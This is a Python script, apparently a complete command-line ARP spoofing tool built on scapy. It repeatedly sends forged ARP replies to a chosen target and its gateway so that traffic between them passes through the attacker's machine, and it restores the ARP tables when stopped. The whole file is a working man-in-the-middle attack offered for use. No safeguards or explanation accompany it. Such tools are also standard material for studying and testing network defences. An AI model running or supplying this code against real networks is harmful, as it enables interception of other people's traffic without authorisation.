


import scapy.all as scapy
import argparse
import time
import sys
from termcolor import colored


def get_arguments():
    parser=argparse.ArgumentParser(colored('Usage of the Program ','green')+(colored(' pyhton3 arpspoofing.py -t <ip> -g <ip>\n','red')))
    parser.add_argument("-t",dest="target",help="Specify the Target name")
    parser.add_argument("-g",dest="gateway",help="Specify the gateway")
    return parser.parse_args()

def get_mac(target__ip):
    arp_packet=scapy.ARP(pdst=target__ip)
    broadcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet=broadcast_packet/arp_packet
    answered_list=scapy.srp(arp_broadcast_packet,timeout=1,verbose=False)
    return answered_list[0][0][1].hwsrc


def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet)
    time.sleep(1)
    scapy.send(packet)

    



count=0
arguments=get_arguments()
try:
    while  True:
        spoof(arguments.target,arguments.gateway)
        spoof(arguments.gateway,arguments.target)
        count+=1
        print(colored("\r[+] sent packets "+str(count),'yellow'),flush=True,end='')
        time.sleep(1)
except KeyboardInterrupt:
    print(colored("\n stopped by User",'red'))
    restore(arguments.target,arguments.gateway)
    restore(arguments.gateway,arguments.target)
    print(colored('Successfully restored','green'))
